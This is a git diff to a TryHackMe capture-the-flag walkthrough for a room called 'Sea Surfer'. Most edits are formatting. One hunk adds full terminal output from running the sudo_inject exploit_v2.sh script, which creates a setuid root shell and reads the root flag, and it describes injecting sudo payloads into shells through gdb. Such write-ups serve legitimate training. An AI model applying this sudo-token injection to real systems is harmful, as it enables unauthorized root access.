@@ -11,7 +11,7 @@ Inspiration for the box's foothold was a real-world pentest, where I managed to 
 
 I love **TryHackMe**, since it's the place where I first started to learn about infosec, but they were missing this particular vulnerability so I decided to make a room for it myself.
 
-Ok, walkthrough roleplay on:
+Without further ado, let's get our walkthrough roleplay on:
 
 ## Initial enumeration
 Let's launch the machine and wait at least 5 minutes for it to fully boot up.
@@ -85,7 +85,7 @@ We're probably mostly interested in **Kyle**, as they are the company's sysadmin
 lassi@kali:~$ wpscan --url http://seasurfer.thm/ --api-token <redacted> -e ap, cb, u
 ```
 
-There was really nothing exciting found, apart from a plugin XSS vulnerability which requires admin privileges. Otherwise it seems to be a pretty up to date default Wordpress installation. How about running `gobuster` again, this time with a bigger `big.txt` wordlist, maybe this virtual host could have some hidden directories?
+There was really nothing exciting found, apart from a plugin `XSS` vulnerability which requires admin privileges. Otherwise it seems to be a pretty up to date default **Wordpress** installation. How about running `gobuster` again, this time with a bigger `big.txt` wordlist, maybe this virtual host could have some hidden directories?
 
 ```zsh
 lassi@kali:~$ gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt dir -u http://seasurfer.thm/ 
@@ -419,18 +419,35 @@ This is free software: you are free to change and redistribute it.
 kyle@seasurfer:/tmp/gdb/usr/bin$ export PATH=$(pwd):$PATH
 ```
 
-Now we should have all of the prerequisites for the exploits met.
+Now we should have all of the prerequisites for the exploits met. 
 
 (sidenote, do not use the `exploit.sh` from the [sudo_inject git repo](https://github.com/nongiach/sudo_inject). For whatever reason, the `activate_sudo_token` binary seems to corrupt shell processes on a random chance - if anyone is able to figure it out, please contact me)
 
 Now all what's left for us to do is fire away the `exploit_v2.sh` script, hoping for the best!
 
 ```zsh
-fixthis
-.......
+kyle@seasurfer:~$ sh exploit_v2.sh 
+Creating suid shell in /tmp/sh
+Current process : 16965
+Injecting process 845 -> bash
+Injecting process 1313 -> sh
+Injecting process 1321 -> sh
+Injecting process 1344 -> bash
+Sorry, try again.
+cat: /proc/16966/comm: No such file or directory
+Injecting process 16966 -> 
+kyle@seasurfer:~$ ls -lpah /tmp/sh
+-rwsr-sr-x 1 root root 127K Jun 23 21:44 /tmp/sh
+kyle@seasurfer:~$ /tmp/sh -p
+# whoami
+root
+# cat /root/root.txt
+THM{REDACTED}
 ```
 
-Success! After reading the exploit code, it became clear that it's in fact really simple to exploit manually as well. We just need the `gdb` binary and the **PID** of a shell where the `sudo` token is active:
+Success! After reading the exploit code, it became clear that it's in fact really simple to exploit manually as well. It's just getting the **PIDs** of the running shell processes, attaching to them one by one with `gdb`, and echoing a `sudo` payload with a `system()` call.
+
+We just need the `gdb` binary and the **PID** of a shell where the `sudo` token is active:
 
 ```zsh
 # attach gdb to the shell process with an active sudo token with -p switch
@@ -512,7 +529,7 @@ THM{REDACTED}
 
 That's it! Submit the flags and complete the room. Hope you enjoyed it! :)
 
-Extra credit: How were the processes of ssh'ing to `kyle` from `root` hidden from `ps aux`?
+Extra credit: How were the processes of `ssh`'ing to `kyle` from `root` hidden from `ps aux`?
 Extra credit 2: How did the `SSHtoserver.sh` script use `sudo` on the server without supplying `kyle`'s' password? This is related to onurshin's find!
 
 Credits for the images and some code are in `/root/credits.txt`
